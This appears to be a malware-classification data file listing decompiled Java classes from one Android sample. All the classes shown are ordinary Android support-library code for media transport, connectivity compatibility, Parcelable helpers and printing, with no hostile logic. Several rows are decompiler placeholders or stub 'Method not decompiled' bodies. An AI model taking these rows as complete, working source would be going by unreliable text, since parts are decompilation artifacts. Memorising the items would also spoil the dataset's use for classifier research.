"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportMediatorJellybeanMR2.code","class TransportMediatorJellybeanMR2 implements RemoteControlClient.OnGetPlaybackPositionListener, RemoteControlClient.OnPlaybackPositionUpdateListener {   boolean mAudioFocused;   final AudioManager mAudioManager;   final Context mContext;   boolean mFocused;   final Intent mIntent;   PendingIntent mPendingIntent;   final String mReceiverAction;   final IntentFilter mReceiverFilter;   RemoteControlClient mRemoteControl;   final View mTargetView;   final TransportMediatorCallback mTransportCallback;   final ViewTreeObserver.OnWindowAttachListener mWindowAttachListener=new ViewTreeObserver.OnWindowAttachListener(){     @Override public void onWindowAttached(){       TransportMediatorJellybeanMR2.this.windowAttached();     }     @Override public void onWindowDetached(){       TransportMediatorJellybeanMR2.this.windowDetached();     }   } ;   final ViewTreeObserver.OnWindowFocusChangeListener mWindowFocusListener=new ViewTreeObserver.OnWindowFocusChangeListener(){     @Override public void onWindowFocusChanged(    boolean hasFocus){       if (!hasFocus) {         TransportMediatorJellybeanMR2.this.loseFocus();       }  else {         TransportMediatorJellybeanMR2.this.gainFocus();       }     }   } ;   final BroadcastReceiver mMediaButtonReceiver=new BroadcastReceiver(){     @Override public void onReceive(    Context context,    Intent intent){       try {         KeyEvent event=(KeyEvent)intent.getParcelableExtra(""android.intent.extra.KEY_EVENT"");         TransportMediatorJellybeanMR2.this.mTransportCallback.handleKey(event);       }  catch (      ClassCastException e) {         Log.w(""TransportController"",e);       }     }   } ;   AudioManager.OnAudioFocusChangeListener mAudioFocusChangeListener=new AudioManager.OnAudioFocusChangeListener(){     @Override public void onAudioFocusChange(    int focusChange){       TransportMediatorJellybeanMR2.this.mTransportCallback.handleAudioFocusChange(focusChange);     }   } ;   int mPlayState=0;   public TransportMediatorJellybeanMR2(  Context context,  AudioManager audioManager,  View view,  TransportMediatorCallback transportCallback){     this.mContext=context;     this.mAudioManager=audioManager;     this.mTargetView=view;     this.mTransportCallback=transportCallback;     this.mReceiverAction=context.getPackageName() + "":transport:"" + System.identityHashCode(this);     this.mIntent=new Intent(this.mReceiverAction);     this.mIntent.setPackage(context.getPackageName());     this.mReceiverFilter=new IntentFilter();     this.mReceiverFilter.addAction(this.mReceiverAction);     this.mTargetView.getViewTreeObserver().addOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().addOnWindowFocusChangeListener(this.mWindowFocusListener);   }   public Object getRemoteControlClient(){     return this.mRemoteControl;   }   public void destroy(){     windowDetached();     this.mTargetView.getViewTreeObserver().removeOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().removeOnWindowFocusChangeListener(this.mWindowFocusListener);   }   void windowAttached(){     this.mContext.registerReceiver(this.mMediaButtonReceiver,this.mReceiverFilter);     this.mPendingIntent=PendingIntent.getBroadcast(this.mContext,0,this.mIntent,268435456);     this.mRemoteControl=new RemoteControlClient(this.mPendingIntent);     this.mRemoteControl.setOnGetPlaybackPositionListener(this);     this.mRemoteControl.setPlaybackPositionUpdateListener(this);   }   void gainFocus(){     if (!this.mFocused) {       this.mFocused=true;       this.mAudioManager.registerMediaButtonEventReceiver(this.mPendingIntent);       this.mAudioManager.registerRemoteControlClient(this.mRemoteControl);       if (this.mPlayState == 3) {         takeAudioFocus();       }     }   }   void takeAudioFocus(){     if (!this.mAudioFocused) {       this.mAudioFocused=true;       this.mAudioManager.requestAudioFocus(this.mAudioFocusChangeListener,3,1);     }   }   public void startPlaying(){     if (this.mPlayState != 3) {       this.mPlayState=3;       this.mRemoteControl.setPlaybackState(3);     }     if (this.mFocused) {       takeAudioFocus();     }   }   @Override public long onGetPlaybackPosition(){     return this.mTransportCallback.getPlaybackPosition();   }   @Override public void onPlaybackPositionUpdate(  long newPositionMs){     this.mTransportCallback.playbackPositionUpdate(newPositionMs);   }   public void refreshState(  boolean playing,  long position,  int transportControls){     if (this.mRemoteControl != null) {       this.mRemoteControl.setPlaybackState(playing ? 3 : 1,position,playing ? 1.0f : 0.0f);       this.mRemoteControl.setTransportControlFlags(transportControls);     }   }   public void pausePlaying(){     if (this.mPlayState == 3) {       this.mPlayState=2;       this.mRemoteControl.setPlaybackState(2);     }     dropAudioFocus();   }   public void stopPlaying(){     if (this.mPlayState != 1) {       this.mPlayState=1;       this.mRemoteControl.setPlaybackState(1);     }     dropAudioFocus();   }   void dropAudioFocus(){     if (this.mAudioFocused) {       this.mAudioFocused=false;       this.mAudioManager.abandonAudioFocus(this.mAudioFocusChangeListener);     }   }   void loseFocus(){     dropAudioFocus();     if (this.mFocused) {       this.mFocused=false;       this.mAudioManager.unregisterRemoteControlClient(this.mRemoteControl);       this.mAudioManager.unregisterMediaButtonEventReceiver(this.mPendingIntent);     }   }   void windowDetached(){     loseFocus();     if (this.mPendingIntent != null) {       this.mContext.unregisterReceiver(this.mMediaButtonReceiver);       this.mPendingIntent.cancel();       this.mPendingIntent=null;       this.mRemoteControl=null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportPerformer.code","public abstract class TransportPerformer {   static final int AUDIOFOCUS_GAIN=1;   static final int AUDIOFOCUS_GAIN_TRANSIENT=2;   static final int AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK=3;   static final int AUDIOFOCUS_LOSS=-1;   static final int AUDIOFOCUS_LOSS_TRANSIENT=-2;   static final int AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK=-3;   public abstract long onGetCurrentPosition();   public abstract long onGetDuration();   public abstract boolean onIsPlaying();   public abstract void onPause();   public abstract void onSeekTo(  long j);   public abstract void onStart();   public abstract void onStop();   public int onGetBufferPercentage(){     return 100;   }   public int onGetTransportControlFlags(){     return 60;   }   public boolean onMediaButtonDown(  int r3,  android.view.KeyEvent r4){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.media.TransportPerformer.onMediaButtonDown(int, android.view.KeyEvent):boolean"");   }   public boolean onMediaButtonUp(  int keyCode,  KeyEvent event){     return true;   }   public void onAudioFocusChange(  int focusChange){     int keyCode=0; switch (focusChange) { case -1:       keyCode=TransportMediator.KEYCODE_MEDIA_PAUSE;     break; } if (keyCode != 0) {   long now=SystemClock.uptimeMillis();   onMediaButtonDown(keyCode,new KeyEvent(now,now,0,keyCode,0));   onMediaButtonUp(keyCode,new KeyEvent(now,now,1,keyCode,0)); } } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportStateListener.code","public class TransportStateListener {   public void onPlayingChanged(  TransportController controller){   }   public void onTransportControlsChanged(  TransportController controller){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\BaseConnectivityManagerCompatImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@519d9cc1"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\BaseTrafficStatsCompatImpl.code","static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){     @Override public SocketTags initialValue(){       return new SocketTags();     }   } ; public static class SocketTags {     public int statsTag;     private SocketTags(){       this.statsTag=-1;     }   }   BaseTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     this.mThreadSocketTags.get().statsTag=-1;   }   @Override public int getThreadStatsTag(){     return this.mThreadSocketTags.get().statsTag;   }   @Override public void incrementOperationCount(  int operationCount){   }   @Override public void incrementOperationCount(  int tag,  int operationCount){   }   @Override public void setThreadStatsTag(  int tag){     this.mThreadSocketTags.get().statsTag=tag;   }   @Override public void tagSocket(  Socket socket){   }   @Override public void untagSocket(  Socket socket){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\ConnectivityManagerCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@38f8e674"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\ConnectivityManagerCompatGingerbread.code","!org.eclipse.jdt.core.dom.TypeDeclaration@249f78f6"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\ConnectivityManagerCompatHoneycombMR2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6898eff0"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\ConnectivityManagerCompatImpl.code","interface ConnectivityManagerCompatImpl {   boolean isActiveNetworkMetered(  ConnectivityManager connectivityManager); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\ConnectivityManagerCompatJellyBean.code","class ConnectivityManagerCompatJellyBean {   ConnectivityManagerCompatJellyBean(){   }   public static boolean isActiveNetworkMetered(  ConnectivityManager cm){     return cm.isActiveNetworkMetered();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\GingerbreadConnectivityManagerCompatImpl.code","static class GingerbreadConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   GingerbreadConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatGingerbread.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\HoneycombMR2ConnectivityManagerCompatImpl.code","static class HoneycombMR2ConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   HoneycombMR2ConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatHoneycombMR2.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\IcsTrafficStatsCompatImpl.code","static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   IcsTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     TrafficStatsCompatIcs.clearThreadStatsTag();   }   @Override public int getThreadStatsTag(){     return TrafficStatsCompatIcs.getThreadStatsTag();   }   @Override public void incrementOperationCount(  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(operationCount);   }   @Override public void incrementOperationCount(  int tag,  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);   }   @Override public void setThreadStatsTag(  int tag){     TrafficStatsCompatIcs.setThreadStatsTag(tag);   }   @Override public void tagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.tagSocket(socket);   }   @Override public void untagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\JellyBeanConnectivityManagerCompatImpl.code","static class JellyBeanConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   JellyBeanConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatJellyBean.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\SocketTags.code","public static class SocketTags {   public int statsTag;   private SocketTags(){     this.statsTag=-1;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\TrafficStatsCompat.code","public class TrafficStatsCompat {   private static final TrafficStatsCompatImpl IMPL; interface TrafficStatsCompatImpl {     void clearThreadStatsTag();     int getThreadStatsTag();     void incrementOperationCount(    int i);     void incrementOperationCount(    int i,    int i2);     void setThreadStatsTag(    int i);     void tagSocket(    Socket socket) throws SocketException ;     void untagSocket(    Socket socket) throws SocketException ;   } static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){       @Override public SocketTags initialValue(){         return new SocketTags();       }     } ; public static class SocketTags {       public int statsTag;       private SocketTags(){         this.statsTag=-1;       }     }     BaseTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       this.mThreadSocketTags.get().statsTag=-1;     }     @Override public int getThreadStatsTag(){       return this.mThreadSocketTags.get().statsTag;     }     @Override public void incrementOperationCount(    int operationCount){     }     @Override public void incrementOperationCount(    int tag,    int operationCount){     }     @Override public void setThreadStatsTag(    int tag){       this.mThreadSocketTags.get().statsTag=tag;     }     @Override public void tagSocket(    Socket socket){     }     @Override public void untagSocket(    Socket socket){     }   } static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     IcsTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       TrafficStatsCompatIcs.clearThreadStatsTag();     }     @Override public int getThreadStatsTag(){       return TrafficStatsCompatIcs.getThreadStatsTag();     }     @Override public void incrementOperationCount(    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(operationCount);     }     @Override public void incrementOperationCount(    int tag,    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);     }     @Override public void setThreadStatsTag(    int tag){       TrafficStatsCompatIcs.setThreadStatsTag(tag);     }     @Override public void tagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.tagSocket(socket);     }     @Override public void untagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.untagSocket(socket);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new IcsTrafficStatsCompatImpl();     }  else {       IMPL=new BaseTrafficStatsCompatImpl();     }   }   public static void clearThreadStatsTag(){     IMPL.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return IMPL.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     IMPL.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     IMPL.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     IMPL.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     IMPL.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     IMPL.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\TrafficStatsCompatIcs.code","class TrafficStatsCompatIcs {   TrafficStatsCompatIcs(){   }   public static void clearThreadStatsTag(){     TrafficStats.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return TrafficStats.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     TrafficStats.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     TrafficStats.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     TrafficStats.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     TrafficStats.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     TrafficStats.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.net\TrafficStatsCompatImpl.code","interface TrafficStatsCompatImpl {   void clearThreadStatsTag();   int getThreadStatsTag();   void incrementOperationCount(  int i);   void incrementOperationCount(  int i,  int i2);   void setThreadStatsTag(  int i);   void tagSocket(  Socket socket) throws SocketException ;   void untagSocket(  Socket socket) throws SocketException ; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\CompatCreator.code","static class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel source){     return this.mCallbacks.createFromParcel(source,null);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\EnvironmentCompat.code","public class EnvironmentCompat {   public static final String MEDIA_UNKNOWN=""unknown"";   private static final String TAG=""EnvironmentCompat"";   public static String getStorageState(  File path){     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return EnvironmentCompatKitKat.getStorageState(path);     }     try {       String canonicalPath=path.getCanonicalPath();       String canonicalExternal=Environment.getExternalStorageDirectory().getCanonicalPath();       if (canonicalPath.startsWith(canonicalExternal)) {         return Environment.getExternalStorageState();       }     }  catch (    IOException e) {       Log.w(TAG,""Failed to resolve canonical path: "" + e);     }     return MEDIA_UNKNOWN;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\EnvironmentCompatKitKat.code","class EnvironmentCompatKitKat {   EnvironmentCompatKitKat(){   }   public static String getStorageState(  File path){     return Environment.getStorageState(path);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\ParcelableCompat.code","public class ParcelableCompat {   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(callbacks);     }     return new CompatCreator(callbacks);   } static class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> callbacks){       this.mCallbacks=callbacks;     }     @Override public T createFromParcel(    Parcel source){       return this.mCallbacks.createFromParcel(source,null);     }     @Override public T[] newArray(    int size){       return this.mCallbacks.newArray(size);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel in){     return this.mCallbacks.createFromParcel(in,null);   }   @Override public T createFromParcel(  Parcel in,  ClassLoader loader){     return this.mCallbacks.createFromParcel(in,loader);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> callbacks){     return new ParcelableCompatCreatorHoneycombMR2(callbacks);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.print\PrintHelper.code","public final class PrintHelper {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   PrintHelperVersionImpl mImpl; interface PrintHelperVersionImpl {     int getColorMode();     int getScaleMode();     void printBitmap(    String str,    Bitmap bitmap);     void printBitmap(    String str,    Uri uri) throws FileNotFoundException ;     void setColorMode(    int i);     void setScaleMode(    int i);   }   public static boolean systemSupportsPrint(){     return Build.VERSION.SDK_INT >= 19;   } private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {     int mColorMode;     int mScaleMode;     private PrintHelperStubImpl(){       this.mScaleMode=2;       this.mColorMode=2;     }     @Override public void setScaleMode(    int scaleMode){       this.mScaleMode=scaleMode;     }     @Override public int getColorMode(){       return this.mColorMode;     }     @Override public void setColorMode(    int colorMode){       this.mColorMode=colorMode;     }     @Override public int getScaleMode(){       return this.mScaleMode;     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){     }     @Override public void printBitmap(    String jobName,    Uri imageFile){     }   } private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {     private final PrintHelperKitkat printHelper;     PrintHelperKitkatImpl(    Context context){       this.printHelper=new PrintHelperKitkat(context);     }     @Override public void setScaleMode(    int scaleMode){       this.printHelper.setScaleMode(scaleMode);     }     @Override public int getScaleMode(){       return this.printHelper.getScaleMode();     }     @Override public void setColorMode(    int colorMode){       this.printHelper.setColorMode(colorMode);     }     @Override public int getColorMode(){       return this.printHelper.getColorMode();     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){       this.printHelper.printBitmap(jobName,bitmap);     }     @Override public void printBitmap(    String jobName,    Uri imageFile) throws FileNotFoundException {       this.printHelper.printBitmap(jobName,imageFile);     }   }   public PrintHelper(  Context context){     if (systemSupportsPrint()) {       this.mImpl=new PrintHelperKitkatImpl(context);     }  else {       this.mImpl=new PrintHelperStubImpl();     }   }   public void setScaleMode(  int scaleMode){     this.mImpl.setScaleMode(scaleMode);   }   public int getScaleMode(){     return this.mImpl.getScaleMode();   }   public void setColorMode(  int colorMode){     this.mImpl.setColorMode(colorMode);   }   public int getColorMode(){     return this.mImpl.getColorMode();   }   public void printBitmap(  String jobName,  Bitmap bitmap){     this.mImpl.printBitmap(jobName,bitmap);   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.mImpl.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.print\PrintHelperKitkat.code","public class PrintHelperKitkat {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   private static final String LOG_TAG=""PrintHelperKitkat"";   private static final int MAX_PRINT_SIZE=3500;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   final Context mContext;   int mScaleMode=2;   int mColorMode=2;   public PrintHelperKitkat(  Context context){     this.mContext=context;   }   public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   public int getScaleMode(){     return this.mScaleMode;   }   public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   public int getColorMode(){     return this.mColorMode;   }   public void printBitmap(  final String jobName,  final Bitmap bitmap){     if (bitmap != null) {       final int fittingMode=this.mScaleMode;       PrintManager printManager=(PrintManager)this.mContext.getSystemService(""print"");       PrintAttributes.MediaSize mediaSize=PrintAttributes.MediaSize.UNKNOWN_PORTRAIT;       if (bitmap.getWidth() > bitmap.getHeight()) {         mediaSize=PrintAttributes.MediaSize.UNKNOWN_LANDSCAPE;       }       PrintAttributes attr=new PrintAttributes.Builder().setMediaSize(mediaSize).setColorMode(this.mColorMode).build();       printManager.print(jobName,new PrintDocumentAdapter(){         private PrintAttributes mAttributes;         @Override public void onLayout(        PrintAttributes oldPrintAttributes,        PrintAttributes newPrintAttributes,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.LayoutResultCallback layoutResultCallback,        Bundle bundle){           this.mAttributes=newPrintAttributes;           PrintDocumentInfo info=new PrintDocumentInfo.Builder(jobName).setContentType(1).setPageCount(1).build();           boolean changed=newPrintAttributes.equals(oldPrintAttributes) ? false : true;           layoutResultCallback.onLayoutFinished(info,changed);         }         @Override public void onWrite(        PageRange[] pageRanges,        ParcelFileDescriptor fileDescriptor,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.WriteResultCallback writeResultCallback){           float scale;           PrintedPdfDocument pdfDocument=new PrintedPdfDocument(PrintHelperKitkat.this.mContext,this.mAttributes);           try {             PdfDocument.Page page=pdfDocument.startPage(1);             RectF content=new RectF(page.getInfo().getContentRect());             Matrix matrix=new Matrix();             float scale2=content.width() / bitmap.getWidth();             if (fittingMode == 2) {               scale=Math.max(scale2,content.height() / bitmap.getHeight());             }  else {               scale=Math.min(scale2,content.height() / bitmap.getHeight());             }             matrix.postScale(scale,scale);             float translateX=(content.width() - (bitmap.getWidth() * scale)) / 2.0f;             float translateY=(content.height() - (bitmap.getHeight() * scale)) / 2.0f;             matrix.postTranslate(translateX,translateY);             page.getCanvas().drawBitmap(bitmap,matrix,null);             pdfDocument.finishPage(page);             try {               pdfDocument.writeTo(new FileOutputStream(fileDescriptor.getFileDescriptor()));               writeResultCallback.onWriteFinished(new PageRange[]{PageRange.ALL_PAGES});             }  catch (            IOException ioe) {               Log.e(PrintHelperKitkat.LOG_TAG,""Error writing printed content"",ioe);               writeResultCallback.onWriteFailed(null);             }             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e) {               }             }           }  catch (          Throwable th) {             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e2) {               }             }             throw th;           }         }       } ,attr);     }   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     Bitmap bitmap=loadConstrainedBitmap(imageFile,MAX_PRINT_SIZE);     printBitmap(jobName,bitmap);   }   private Bitmap loadConstrainedBitmap(  Uri uri,  int maxSideLength) throws FileNotFoundException {     if (maxSideLength <= 0 || uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to getScaledBitmap"");     }     BitmapFactory.Options opt=new BitmapFactory.Options();     opt.inJustDecodeBounds=true;     loadBitmap(uri,opt);     int w=opt.outWidth;     int h=opt.outHeight;     if (w <= 0 || h <= 0) {       return null;     }     int imageSide=Math.max(w,h);     int sampleSize=1;     while (imageSide > maxSideLength) {       imageSide>>>=1;       sampleSize<<=1;     }     if (sampleSize <= 0 || Math.min(w,h) / sampleSize <= 0) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inMutable=true;     options.inSampleSize=sampleSize;     return loadBitmap(uri,options);   }   private Bitmap loadBitmap(  Uri uri,  BitmapFactory.Options o) throws FileNotFoundException {     if (uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to loadBitmap"");     }     InputStream is=null;     try {       is=this.mContext.getContentResolver().openInputStream(uri);       return BitmapFactory.decodeStream(is,null,o);     }   finally {       if (is != null) {         try {           is.close();         }  catch (        IOException t) {           Log.w(LOG_TAG,""close fail "",t);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.print\PrintHelperKitkatImpl.code","private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {   private final PrintHelperKitkat printHelper;   PrintHelperKitkatImpl(  Context context){     this.printHelper=new PrintHelperKitkat(context);   }   @Override public void setScaleMode(  int scaleMode){     this.printHelper.setScaleMode(scaleMode);   }   @Override public int getScaleMode(){     return this.printHelper.getScaleMode();   }   @Override public void setColorMode(  int colorMode){     this.printHelper.setColorMode(colorMode);   }   @Override public int getColorMode(){     return this.printHelper.getColorMode();   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){     this.printHelper.printBitmap(jobName,bitmap);   }   @Override public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.printHelper.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.print\PrintHelperStubImpl.code","private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {   int mColorMode;   int mScaleMode;   private PrintHelperStubImpl(){     this.mScaleMode=2;     this.mColorMode=2;   }   @Override public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   @Override public int getColorMode(){     return this.mColorMode;   }   @Override public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   @Override public int getScaleMode(){     return this.mScaleMode;   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){   }   @Override public void printBitmap(  String jobName,  Uri imageFile){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.print\PrintHelperVersionImpl.code","interface PrintHelperVersionImpl {   int getColorMode();   int getScaleMode();   void printBitmap(  String str,  Bitmap bitmap);   void printBitmap(  String str,  Uri uri) throws FileNotFoundException ;   void setColorMode(  int i);   void setScaleMode(  int i); } "
